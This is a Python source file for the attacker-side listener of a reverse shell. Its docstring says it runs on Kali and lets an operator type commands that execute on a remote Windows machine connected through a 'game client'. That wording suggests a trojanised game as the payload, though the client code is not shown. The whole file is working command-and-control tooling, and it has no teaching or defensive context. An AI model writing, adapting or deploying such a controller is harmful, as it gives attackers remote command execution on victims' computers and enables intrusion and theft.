import socket
import subprocess
from datetime import datetime


def handle_client(conn: socket.socket, addr: tuple[str, int]) -> None:
    """
    Very simple interactive controller for the reverse shell client.

    This runs on Kali. It accepts a single connection from the game
    client and then allows the operator to type commands which will
    be executed on the remote Windows machine.
    """
    print(f"[+] Connection from {addr[0]}:{addr[1]} at {datetime.now().isoformat(timespec='seconds')}")
    f = conn.makefile("rwb", buffering=0)

    # Read optional banner from client
    try:
        banner = f.readline().decode("utf-8", errors="ignore").strip()
        if banner:
            print(f"[client] {banner}")
    except OSError:
        pass

    try:
        while True:
            try:
                cmd = input("shell> ")
            except (EOFError, KeyboardInterrupt):
                cmd = "exit"

            if not cmd.strip():
                continue

            f.write((cmd.strip() + "\n").encode("utf-8"))

            if cmd.strip().lower() in {"exit", "quit"}:
                print("[*] Closing session.")
                break

            # Read until END marker from client
            print("--- output start ---")
            while True:
                line = f.readline()
                if not line:
                    print("[!] Connection closed by client.")
                    return
                if line.rstrip(b"\n") == b"<<<END_OF_COMMAND>>>":
                    break
                print(line.decode("utf-8", errors="ignore"), end="")
            print("\n--- output end ---")
    finally:
        try:
            f.close()
        except OSError:
            pass
        try:
            conn.close()
        except OSError:
            pass


def run_listener(host: str = "0.0.0.0", port: int = 5050) -> None:
    """
    Start a TCP listener suitable for use with the game client.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(1)
        print(f"[+] Listening on {host}:{port} (Ctrl+C to stop)")

        while True:
            try:
                conn, addr = server.accept()
            except KeyboardInterrupt:
                print("\n[*] Listener stopped.")
                break
            handle_client(conn, addr)


def main() -> None:
    # For quick use: adjust the port here or run via CLI overrides later.
    run_listener()


if __name__ == "__main__":
    main()

